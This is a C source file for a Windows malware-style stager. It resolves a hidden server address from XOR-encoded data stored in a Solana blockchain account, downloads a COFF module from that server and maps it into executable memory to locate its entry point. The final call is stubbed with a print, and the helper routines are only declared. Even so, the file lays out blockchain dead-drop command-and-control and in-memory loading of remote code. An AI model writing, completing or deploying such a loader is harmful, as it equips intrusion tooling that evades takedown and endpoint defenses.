#include <windows.h>
#include <winhttp.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef void (*module_entry_t)(void);

extern char *http_post_json(const char *url, const char *body);
extern uint8_t *http_get_bytes(const char *url, size_t *length);
extern uint8_t *json_first_data_value(char *response, size_t *length);
extern uint8_t *base64_decode(const uint8_t *encoded, size_t encoded_len,
                              size_t *decoded_len);
extern void apply_coff_relocations(uint8_t *image, IMAGE_FILE_HEADER *header);
extern void *resolve_coff_symbol(uint8_t *image, IMAGE_SYMBOL *symbols,
                                 DWORD symbol_count, const char *name);

static char *resolve_stage_server(void) {
    static const uint8_t xor_key[] = {0x31, 0x7a, 0xc4, 0x09, 0x52};
    static const char rpc_url[] = "https://api.mainnet.solana.com";
    static const char request[] =
        "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getAccountInfo\","
        "\"params\":[\"ExampleAccount111111111111111111111111111111\","
        "{\"encoding\":\"base64\"}]}";

    char *response = http_post_json(rpc_url, request);
    size_t encoded_len = 0;
    uint8_t *encoded = json_first_data_value(response, &encoded_len);
    size_t decoded_len = 0;
    uint8_t *decoded = base64_decode(encoded, encoded_len, &decoded_len);

    for (size_t i = 0; i < decoded_len; ++i) {
        decoded[i] ^= xor_key[i % sizeof(xor_key)];
    }
    decoded[decoded_len] = '\0';
    return (char *)decoded;
}

static void execute_coff_module(uint8_t *object, size_t object_len) {
    IMAGE_FILE_HEADER *header = (IMAGE_FILE_HEADER *)object;
    if (object_len < sizeof(*header) ||
        header->Machine != IMAGE_FILE_MACHINE_AMD64 ||
        header->NumberOfSections == 0 || header->PointerToSymbolTable == 0) {
        return;
    }

    IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(header + 1);
    IMAGE_SYMBOL *symbols = (IMAGE_SYMBOL *)(object + header->PointerToSymbolTable);
    uint8_t *mapped = VirtualAlloc(NULL, object_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mapped) return;

    for (WORD i = 0; i < header->NumberOfSections; ++i) {
        memcpy(mapped + sections[i].VirtualAddress,
               object + sections[i].PointerToRawData,
               sections[i].SizeOfRawData);
    }
    apply_coff_relocations(mapped, header);
    module_entry_t entry = (module_entry_t)resolve_coff_symbol(
        mapped, symbols, header->NumberOfSymbols, "module_init");
    if (entry) puts("entry located");
}

int main(void) {
    char *server = resolve_stage_server();
    char module_url[512];
    snprintf(module_url, sizeof(module_url), "https://%s/get_coff_module_cmd", server);

    size_t module_len = 0;
    uint8_t *module = http_get_bytes(module_url, &module_len);
    execute_coff_module(module, module_len);
    return 0;
}
